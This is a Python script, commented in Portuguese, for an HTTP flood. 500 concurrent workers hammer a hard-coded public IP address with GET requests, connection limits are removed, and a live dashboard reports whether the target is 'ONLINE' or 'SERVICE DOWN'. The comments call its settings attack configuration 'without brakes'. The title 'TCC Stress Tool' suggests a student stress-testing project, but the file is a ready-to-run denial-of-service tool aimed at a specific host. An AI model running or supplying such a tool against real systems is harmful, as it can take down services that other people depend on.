import asyncio
import aiohttp
import time
import threading
import tkinter as tk
from collections import deque
import matplotlib.pyplot as plt
import csv

# Tenta usar uvloop para máxima performance em Linux/Mac
try:
    import uvloop
    asyncio.set_event_loop_policy(uvloop.EventLoopPolicy())
except:
    pass

# CONFIGURAÇÕES DE ATAQUE (SEM FREIOS)
TARGET_HTTP = "http://179.188.11.47"
CONCURRENCY = 500  # Aumente conforme necessário
TIMEOUT_SECONDS = 5

metrics = {
    "requests": 0,
    "errors": 0,
    "rtt": [],
    "online": True
}

rps_history = deque(maxlen=120)
rtt_history = deque(maxlen=120)
err_history = deque(maxlen=120)

lock = asyncio.Lock()

# ---------------- HTTP WORKER (MODO AGRESSIVO) ----------------

async def http_worker(session):
    while True:
        start = time.time()
        try:
            # timeout curto para não prender o worker em conexões "zumbis"
            async with session.get(TARGET_HTTP, timeout=TIMEOUT_SECONDS) as resp:
                # .read() é mais leve que .text()
                await resp.read() 
                
            rtt = time.time() - start
            async with lock:
                metrics["requests"] += 1
                metrics["rtt"].append(rtt)
                metrics["online"] = True
        except Exception:
            async with lock:
                metrics["errors"] += 1
                metrics["online"] = False
            # Pequena pausa apenas em caso de erro para não travar o loop local
            await asyncio.sleep(0.01)

# ---------------- METRICS & UI (MANTIDOS) ----------------

async def metrics_loop():
    last_requests = 0
    while True:
        await asyncio.sleep(1)
        async with lock:
            total = metrics["requests"]
            errors = metrics["errors"]
            rps = total - last_requests
            last_requests = total
            avg_rtt = sum(metrics["rtt"]) / len(metrics["rtt"]) if metrics["rtt"] else 0
            metrics["rtt"].clear()
            online = metrics["online"]

        rps_history.append(rps)
        rtt_history.append(avg_rtt)
        err_history.append(errors)
        print(f"STATUS={'ONLINE' if online else 'DOWN'} | RPS={rps} | RTT={avg_rtt:.3f} | ERR={errors}")

def dashboard():
    plt.ion()
    fig, ax = plt.subplots()
    while True:
        if len(rps_history) > 0:
            ax.clear()
            ax.plot(list(rps_history), label="RPS", color='blue')
            ax.plot(list(err_history), label="Errors", color='red')
            ax.set_title("Stress Test Monitor")
            ax.legend()
            plt.pause(1)
        else:
            time.sleep(1)

class NOC_GUI:
    def __init__(self, root):
        self.root = root
        root.title("TCC Stress Tool")
        self.status = tk.Label(root, text="ONLINE", bg="green", fg="white", font=("Arial", 16), width=20)
        self.status.pack(pady=10)
        self.info = tk.Label(root, text="", font=("Consolas", 11), justify="left")
        self.info.pack()
        self.last_requests = 0
        self.update_ui()

    def update_ui(self):
        total = metrics["requests"]
        errors = metrics["errors"]
        rps = total - self.last_requests
        self.last_requests = total
        avg_rtt = sum(metrics["rtt"]) / len(metrics["rtt"]) if metrics["rtt"] else 0
        
        self.status.config(text="ONLINE" if metrics["online"] else "SERVICE DOWN", 
                           bg="green" if metrics["online"] else "red")
        
        text = f"Target: {TARGET_HTTP}\nRPS: {rps}\nTotal: {total}\nErrors: {errors}\nAvg RTT: {round(avg_rtt,3)}s"
        self.info.config(text=text)
        self.root.after(1000, self.update_ui)

async def main():
    # limit=0 remove o limite de conexões simultâneas do aiohttp
    connector = aiohttp.TCPConnector(limit=0, ttl_dns_cache=300)
    async with aiohttp.ClientSession(connector=connector) as session:
        tasks = [asyncio.create_task(http_worker(session)) for _ in range(CONCURRENCY)]
        tasks.append(asyncio.create_task(metrics_loop()))
        await asyncio.gather(*tasks)

if __name__ == "__main__":
    threading.Thread(target=dashboard, daemon=True).start()
    threading.Thread(target=lambda: asyncio.run(main()), daemon=True).start()
    
    root = tk.Tk()
    app = NOC_GUI(root)
    root.mainloop()